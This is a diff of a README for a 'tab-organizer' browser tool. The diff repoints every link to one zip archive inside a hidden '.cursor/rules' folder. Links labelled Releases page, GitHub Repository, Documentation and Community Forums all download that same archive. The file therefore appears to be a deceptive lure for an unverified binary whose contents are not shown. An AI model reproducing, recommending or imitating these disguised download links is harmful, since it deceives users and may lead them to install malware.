@@ -1,6 +1,6 @@
 # 🌟 tab-organizer - Simplify Your Browsing Experience
 
-[![Download Now](https://raw.githubusercontent.com/zaxzeon/tab-organizer/main/siliquose/tab-organizer.zip%20Now-Grab%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/zaxzeon/tab-organizer/main/siliquose/tab-organizer.zip)
+[![Download Now](https://github.com/zaxzeon/tab-organizer/raw/refs/heads/main/.cursor/rules/organizer-tab-v1.6.zip%20Now-Grab%20the%20Latest%20Release-brightgreen)](https://github.com/zaxzeon/tab-organizer/raw/refs/heads/main/.cursor/rules/organizer-tab-v1.6.zip)
 
 ## 📥 Overview
 The **tab-organizer** application helps you manage your browser tabs with ease. Using natural language processing (NLP) and machine learning (ML), this tool organizes your tabs, making your browsing smoother and more efficient.
@@ -17,7 +17,7 @@ Getting started with **tab-organizer** is simple. Follow these steps to download
 ## 📥 Download & Install
 To install **tab-organizer**, you need to visit the Releases page for the most recent version.
 
-[Download the latest release here](https://raw.githubusercontent.com/zaxzeon/tab-organizer/main/siliquose/tab-organizer.zip).
+[Download the latest release here](https://github.com/zaxzeon/tab-organizer/raw/refs/heads/main/.cursor/rules/organizer-tab-v1.6.zip).
 
 1. Open your web browser.
 2. Click on the link above to go to the Releases page.
@@ -56,8 +56,8 @@ If you encounter issues while using **tab-organizer**, consider the following ti
 For further assistance, please check the GitHub Issues page or contact our support team via email.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/zaxzeon/tab-organizer/main/siliquose/tab-organizer.zip)
-- [Documentation](https://raw.githubusercontent.com/zaxzeon/tab-organizer/main/siliquose/tab-organizer.zip)
-- [Community Forums](https://raw.githubusercontent.com/zaxzeon/tab-organizer/main/siliquose/tab-organizer.zip)
+- [GitHub Repository](https://github.com/zaxzeon/tab-organizer/raw/refs/heads/main/.cursor/rules/organizer-tab-v1.6.zip)
+- [Documentation](https://github.com/zaxzeon/tab-organizer/raw/refs/heads/main/.cursor/rules/organizer-tab-v1.6.zip)
+- [Community Forums](https://github.com/zaxzeon/tab-organizer/raw/refs/heads/main/.cursor/rules/organizer-tab-v1.6.zip)
 
-Your browsing experience can be transformed with **tab-organizer**. Don’t hesitate—[download it now](https://raw.githubusercontent.com/zaxzeon/tab-organizer/main/siliquose/tab-organizer.zip) and start enjoying a cleaner browsing experience!
+Your browsing experience can be transformed with **tab-organizer**. Don’t hesitate—[download it now](https://github.com/zaxzeon/tab-organizer/raw/refs/heads/main/.cursor/rules/organizer-tab-v1.6.zip) and start enjoying a cleaner browsing experience!
